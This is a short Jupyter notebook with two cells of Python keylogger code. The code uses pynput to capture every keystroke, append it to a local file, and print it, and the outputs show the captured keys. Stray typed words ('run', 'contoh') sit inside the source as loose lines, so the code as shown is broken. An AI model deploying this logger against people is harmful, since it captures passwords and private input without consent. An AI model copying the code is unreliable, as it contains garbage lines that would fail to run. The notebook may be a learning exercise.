{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ccff3d69",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'r'\n",
      "'u'\n",
      "'n'\n",
      "Key.esc\n"
     ]
    }
   ],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "run\n",
    "k=[]\n",
    "\n",
    "def on_press(key):\n",
    "    k.append(key)\n",
    "    write_1(k)\n",
    "    print(key)\n",
    "\n",
    "def write_1(var):\n",
    "    with open(\"demo.txt\",\"a\") as f:\n",
    "        for i in var:\n",
    "            new_var = str(i).replace(\"'\",'')\n",
    "            f.write(new_var)\n",
    "            f.write(\" \")\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press, on_release=on_release) as l:\n",
    "    l.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "ff2a2357",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'c'\n",
      "'o'\n",
      "'n'\n",
      "'t'\n",
      "'o'\n",
      "'h'\n",
      "Key.esc\n"
     ]
    }
   ],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "k=[]\n",
    "\n",
    "def on_press(key):\n",
    "    k.append(key)\n",
    "    write_1(k)\n",
    "    print(key)\n",
    "    k.clear()\n",
    "\n",
    "def write_1(var):\n",
    "    with open(\"demo.txt\",\"a\") as f:\n",
    "        for i in var:\n",
    "            new_var = str(i).replace(\"'\",'')\n",
    "            f.write(new_var)\n",
    "contoh\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press, on_release=on_release) as l:\n",
    "    l.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
